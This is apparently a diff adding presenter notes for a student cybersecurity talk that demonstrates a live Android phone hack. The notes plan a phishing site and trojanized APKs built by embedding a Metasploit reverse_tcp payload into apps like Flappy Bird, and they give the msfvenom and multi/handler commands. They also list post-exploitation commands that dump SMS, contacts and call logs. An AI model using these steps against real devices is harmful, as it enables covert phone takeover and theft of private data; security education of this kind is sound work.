@@ -1,0 +1,87 @@
+Cyber Security: Presentation & Demo
+-----------------------------------
+
+"How easy it is to hack someone"
+
+- intro
+	- what, why
+	- need
+	- careers
+
+- brief abt demo - `metasploit/hack`
+
+- demo (live)
+	- pre-setup
+		- make a phishing website (host on attacker linux)
+		- keep the malicious apk updated (avaliable on locally hosted site)
+		- ready w/ metasploit receiver
+		- remember the device needs to be connected to same network
+	- attack
+		- ask someone's mobile (android) device with permission to test the attack (explain little what will happen)
+		- connect the attacker wifi
+		- perform hack
+	- post-hack
+		- explain attack & it's severity
+		- preventive measures
+
+- questions
+- thankyou (if anything)
+
+
+---------------------------------
+
+create backup.sh
+	- to install msf
+	- create malicious apk (embeded / non-embeded)
+	- list of all manual cmds
+
+req material (+ for trobleshoot)
+	- metasploit
+	- apache server
+	- working apks (to embed malicious code)
+		- flappy bird
+		- calculator
+
+demo cmds
+	- sysinfo
+	- check_root
+	- dump_calllog
+	- dump_contact
+	- dump_sms
+	- send_sms
+	- app_list
+	- app_run
+
+
+--------------------------------
+
+
+METASPLOIT DEMO STEPS
+
+# metasploit installation
+- curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
+
+
+# start local webserver
+- sudo systemctl start apache2
+- sudo systemctl status apache2
+	// sudo systemctl restart apache2
+	// sudo /etc/init.d/apache2 start
+	// sudo service apache2 start
+
+# dir
+- /var/www/html/
+
+
+# msfvenom
+bash apktool.sh
+sudo apk install apksigner zipalign
+msfvenom -x flappybird.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.8 LPOST=4444 R>mfb.apk
+
+
+# msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost 192.168.1.8
+set lport 4444
+run / exploit
